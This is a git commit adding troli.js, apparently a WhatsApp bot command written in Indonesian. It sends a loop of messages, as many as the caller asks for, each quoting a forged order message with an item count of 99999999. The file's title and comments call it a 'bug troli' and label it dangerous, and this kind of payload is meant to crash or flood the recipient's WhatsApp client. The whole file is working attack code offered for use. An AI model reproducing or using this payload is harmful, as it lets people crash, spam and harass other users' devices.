0ac1cadf1337dc1185f6033f87680adab0124f9d
rickthor7 <96973185+rickthor7@users.noreply.github.com>
2022-01-04 16:23:56 +0700

    Create troli.js

---
+++ troli.js
@@ -0,0 +1,26 @@
+// Bahaya Coeg
+
+case 'troli':
+for (let i = 0; i < args[0]; i++) {
+conn.sendMessage(from, `Punten !!!`, MessageType.extendedText,{
+ quoted: {
+key: {
+participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
+},
+message: {
+orderMessage: {
+itemCount: 99999999,
+status: 1,
+surface: 10,
+orderTitle: 'Bug Troly By Rickthor7',
+sellerJid: '0@s.whatsapp.net'
+}}}}, 0)
+}
+break
+
+/* 
+Penggunaan 
+
+#troli jumlah
+contoh:
+#troli 1
